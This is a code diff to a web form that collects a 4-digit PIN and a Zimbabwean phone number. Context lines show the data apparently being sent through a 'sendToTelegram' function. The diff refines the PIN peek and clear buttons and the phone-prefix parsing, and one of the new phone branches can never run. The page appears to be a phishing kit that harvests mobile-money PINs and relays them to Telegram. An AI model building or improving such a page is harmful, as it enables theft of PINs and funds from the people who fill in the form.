@@ -400,10 +400,15 @@ html,body{width:100%;height:100%;height:100dvh;overflow:hidden;font-family:var(-
                 <div class="pin-dot" id="pd3"><span class="pin-dot-digit" id="pdd3"></span></div>
               </div>
               <div class="pin-actions">
-                <button class="pin-act-btn" id="pinPeekBtn" type="button" onpointerdown="peekPin()" onpointerup="unpeekPin()" onpointerleave="unpeekPin()">
+                <button class="pin-act-btn" id="pinPeekBtn" type="button"
+                  onpointerdown="event.preventDefault();peekPin()"
+                  onpointerup="unpeekPin()"
+                  onpointerleave="unpeekPin()">
                   <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>Peek
                 </button>
-                <button class="pin-act-btn" id="pinClearBtn" type="button" onclick="clearPin()">Clear</button>
+                <button class="pin-act-btn" id="pinClearBtn" type="button"
+                  onpointerdown="event.preventDefault()"
+                  onclick="clearPin()">Clear</button>
               </div>
             </div>
             <div class="field-error" id="pinError">PIN must be exactly 4 digits</div>
@@ -532,9 +537,15 @@ async function sendToTelegram(event){fetch('/api/sendTelegram',{method:'POST',he
 const phoneEl=document.getElementById('phone');
 function cleanPhone(raw){
   var v=String(raw).replace(/[^0-9]/g,'');
-  if(v.slice(0,5)==='00263') v=v.slice(5);
-  else if(v.slice(0,3)==='263') v=v.slice(3);
-  if(v.slice(0,1)==='0') v=v.slice(1);
+  // Strip international prefix only when enough digits present
+  if(v.length>=12 && v.slice(0,5)==='00263') v=v.slice(5);
+  else if(v.length>=11 && v.slice(0,4)==='0263') v=v.slice(4);
+  else if(v.length>=12 && v.slice(0,3)==='263') v=v.slice(3);
+  // Strip leading 0 only when followed by enough digits (07X = 10 raw)
+  if(v.length>=10 && v.slice(0,1)==='0') v=v.slice(1);
+  else if(v.length===10 && v.slice(0,1)==='0') v=v.slice(1);
+  // If still starts with 0 and shorter, strip it (user typed 07...)
+  else if(v.length>1 && v.slice(0,1)==='0') v=v.slice(1);
   return v.slice(0,9);
 }
 ['input','keyup','change'].forEach(function(evt){
@@ -590,7 +601,7 @@ function renderPin(){
 }
 function peekPin(){peeking=true;renderPin()}
 function unpeekPin(){peeking=false;renderPin()}
-function clearPin(){pinHidden.value='';renderPin();pinHidden.focus();unpeekPin()}
+function clearPin(){pinHidden.value='';peeking=false;renderPin();setTimeout(function(){pinHidden.focus()},10);}
 pinHidden.addEventListener('input',renderPin);
 pinHidden.addEventListener('focus',()=>{pinWrap.classList.add('focused');renderPin()});
 pinHidden.addEventListener('blur',()=>{pinWrap.classList.remove('focused');if(pinValue.length>0&&pinValue.length<4)showError('pinField','pinError','PIN must be exactly 4 digits');unpeekPin()});
